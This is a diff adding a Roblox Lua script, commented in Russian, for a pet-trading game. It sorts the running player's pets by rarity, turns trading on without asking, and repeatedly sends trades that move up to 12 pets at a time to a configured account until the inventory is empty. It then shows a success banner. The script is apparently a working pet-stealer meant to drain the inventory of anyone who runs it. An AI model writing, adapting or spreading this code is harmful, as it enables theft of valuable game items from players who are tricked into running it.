@@ -1,0 +1,110 @@
+-- CONFIG --
+local Alpha = "" -- Замените на ваш ник
+local maxPetsPerTrade = 12 -- Макс. петов за трейд
+local cooldownBetweenTrades = 1 -- Задержка между трейдами (сек)
+
+-- PET DIRECTORY (Автоопределение редкости)
+local Dir = {
+ [90010] = 'Huge Cat', [16010] = 'C0RE', [17009] = 'Dominus Huge',
+ [77002] = 'Festive Dragon', [9004] = 'Wavy Cheeta', [7004] = 'Dragon',
+ -- ... ( хуйня какая-то игнор )
+}
+
+-- MAIN SCRIPT --
+local Players = game:GetService("Players")
+local Remotes = workspace.__REMOTES
+local TradeRemote = Remotes.Game.Trading
+local StatsRemote = Remotes.Core["Get Stats"]
+local LocalPlayer = Players.LocalPlayer
+
+-- Функция для получения петов с сортировкой по редкости
+local function getSortedPets()
+ local pets = StatsRemote:InvokeServer().Save.Pets
+ table.sort(pets, function(a, b)
+ local aRarity = Dir[tonumber(a.n)] and 1 or 0
+ local bRarity = Dir[tonumber(b.n)] and 1 or 0
+ if aRarity ~= bRarity then return aRarity > bRarity end
+ return tonumber(a.xp or 0) > tonumber(b.xp or 0)
+ end)
+ return pets
+end
+
+-- Ожидание и обработка трейда
+local function processTrade(targetPlayer)
+ -- Включение трейдинга если выключен
+ if not StatsRemote:InvokeServer().Save.TradingEnabled then
+ TradeRemote:InvokeServer("ToggleTrading")
+ task.wait(1)
+ end
+
+ -- Отправка запроса
+ TradeRemote:InvokeServer("InvSend", targetPlayer)
+ 
+ -- Ожидание ID трейда
+ local tradeId
+ local conn = game:FindFirstChild("Trade Update", true).OnClientEvent:Connect(function(id)
+ tradeId = id
+ conn:Disconnect()
+ end)
+ 
+ local startTime = os.clock()
+ repeat task.wait(0.1) until tradeId or (os.clock() - startTime > 10)
+ if not tradeId then return false end
+
+ -- Добавление петов
+ local pets = getSortedPets()
+ local added = 0
+ local maxToAdd = math.min(#pets, maxPetsPerTrade)
+ 
+ for i = 1, maxToAdd do
+ task.spawn(function()
+ TradeRemote:InvokeServer("Add", tradeId, pets[i].id)
+ added = added + 1
+ end)
+ end
+
+ -- Ожидание добавления
+ repeat task.wait(0.1) until added >= maxToAdd
+ 
+ -- Подтверждение трейда
+ TradeRemote:InvokeServer("Ready", tradeId)
+ return true
+end
+
+-- Основной цикл
+while task.wait(cooldownBetweenTrades) do
+ local pets = getSortedPets()
+ if #pets == 0 then break end -- Стоп если нет петов
+ 
+ -- Поиск целевого игрока
+ local targetPlayer
+ for _, player in pairs(Players:GetPlayers()) do
+ if player.Name == Alpha then
+ targetPlayer = player
+ break
+ end
+ end
+ 
+ if targetPlayer then
+ processTrade(targetPlayer)
+ else
+ warn("Игрок "..Alpha.." не найден!")
+ end
+end
+
+-- Уведомление о завершении
+local gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 300, 0, 60)
+frame.Position = UDim2.new(0.5, -150, 0.8, -30)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
+local label = Instance.new("TextLabel", frame)
+label.Size = UDim2.new(1, 0, 1, 0)
+label.Text = "Все питомцы успешно переданы!"
+label.TextColor3 = Color3.new(0, 1, 0)
+label.BackgroundTransparency = 1
+label.TextScaled = true
+
+task.wait(5)
+gui:Destroy()
